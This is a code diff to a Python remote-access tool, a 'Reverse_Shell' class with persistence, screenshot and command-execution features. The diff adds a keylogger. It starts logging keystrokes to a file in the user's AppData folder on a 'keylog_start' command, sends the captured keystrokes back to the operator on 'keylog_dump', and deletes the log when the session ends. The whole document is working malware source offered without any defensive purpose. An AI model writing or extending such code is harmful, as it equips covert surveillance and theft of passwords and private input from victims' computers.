@@ -9,6 +9,9 @@ import base64
 import requests
 import ctypes
 from mss import mss
+import threading
+from keylogger import Keylogger as keylogger
+
 
 
 # for persistance:
@@ -19,6 +22,7 @@ from mss import mss
 class Reverse_Shell:
     global sock
     global command
+
 
     # declaration of the socket
     # see documentation
@@ -70,9 +74,14 @@ class Reverse_Shell:
                 self.connection()
 
     def execute_command(self):
+        keylogger_path = os.environ["appdata"] + "\\keylogger.txt"
         while True:
             command = self.reliable_receive()
             if command == "q":
+                try:
+                    os.remove(keylogger_path)
+                except:
+                    continue
                 break
             elif command[:2] == "cd" and len(command) > 1:
                 try:
@@ -119,8 +128,15 @@ class Reverse_Shell:
                                    start path -> Start program on target pc
                                    screenshot -> take a screenshort of the target monitor
                                    check      -> Check for administrator privileges 
-                                   q          -> Exit the reverse shell'''
+                                   q          -> Exit the reverse shell
+                                   key_start  -> Start the Keylogger'''
                 self.reliable_send(help_options)
+            elif command[:12] == "keylog_start":
+                t1 = threading.Thread(target=keylogger.start)
+                t1.start()
+            elif command[:11] == "keylog_dump":
+                fin = open(keylogger_path, "r")
+                self.reliable_send(fin.read())
             else:
                 try:
                     # creation of the command, see documentation
